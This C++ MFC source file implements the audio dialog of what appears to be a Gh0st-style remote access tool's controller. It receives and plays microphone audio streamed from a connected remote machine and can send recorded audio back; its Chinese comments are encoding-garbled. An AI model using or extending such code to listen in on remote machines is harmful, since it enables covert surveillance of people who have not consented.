// AudioDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Remote.h"
#include "AudioDlg.h"
#include "afxdialogex.h"
#include "resource.h"
#include "Common.h"


// CAudioDlg �Ի���

IMPLEMENT_DYNAMIC(CAudioDlg, CDialog)

CAudioDlg::CAudioDlg(CWnd* pParent /*=NULL*/,
	IOCPServer* IOCPServer , CONTEXT_OBJECT *ContextObject)
	: CDialog(IDD_DIALOG_AUDIO, pParent)
	, m_bSend(FALSE)
{
	m_ContextObject = ContextObject;
	m_IocpServer = IOCPServer;
	sockaddr_in ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int iClientAddressLength = sizeof(ClientAddress);
	BOOL bResult = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &iClientAddressLength);

	m_strIpAddress = bResult != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "";
	//����ͼ��
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_AUDIO));
	m_bIsWorking = TRUE;
	m_dwTotalRecvBytes = 0;
	m_WorkThreadHandle = NULL;
	m_AudioObject = new CAudio;


}

CAudioDlg::~CAudioDlg()
{
	WaitForSingleObject(m_WorkThreadHandle, INFINITE);
	delete m_AudioObject;
	m_AudioObject = NULL;
}

DWORD WINAPI CAudioDlg::WorkThread(LPVOID lParam)
{
	CAudioDlg* This = (CAudioDlg*)lParam;
	while (This->m_bIsWorking)
	{
		if (!This->m_bSend)
		{
			Sleep(100);
			continue;
		}
		DWORD dwBufferSize = 0;
		LPBYTE szBuffer = This->m_AudioObject->GetRecordBuffer(&dwBufferSize);

		if (szBuffer != NULL && dwBufferSize > 0)
		{
			This->m_IocpServer->OnClientPreSending(This->m_ContextObject,
				szBuffer, dwBufferSize);
		}
	}
	return 0;
}

VOID CAudioDlg::OnReceiveComplete()
{
	m_dwTotalRecvBytes +=
		m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1;
	CString strString;
	strString.Format("Receive %d KBytes", m_dwTotalRecvBytes / 1024);
	SetDlgItemText(IDC_TIPS, strString);
	switch (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[0])
	{
		case TOKEN_AUDIO_DATA:
		{
			m_AudioObject->PlayBuffer(m_ContextObject->InDeCompressedBuffer.GetBuffer(1),
				m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1);
			break;
		}
	
		default:
			break;
	}
	

}

void CAudioDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Check(pDX, IDC_CHECK, m_bSend);
}


BEGIN_MESSAGE_MAP(CAudioDlg, CDialog)
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// CAudioDlg ��Ϣ�������


BOOL CAudioDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��

	SetIcon(m_hIcon, FALSE);
	CString strString;
	strString.Format("\\\\%s - ��������", m_strIpAddress);

	SetWindowText(strString);

	BYTE bToken = COMMAND_NEXT;
	m_IocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(bToken));

	//�����߳� �ж�CheckBox
	m_WorkThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

	return TRUE;  // return TRUE unless you set the focus to a control
				  // �쳣: OCX ����ҳӦ���� FALSE
}


void CAudioDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	m_ContextObject->v1 = 0;
	CancelIo((HANDLE)m_ContextObject->ClientSocket);
	closesocket(m_ContextObject->ClientSocket);


	m_bIsWorking = FALSE;
	WaitForSingleObject(m_WorkThreadHandle, INFINITE);
	CDialog::OnClose();
}
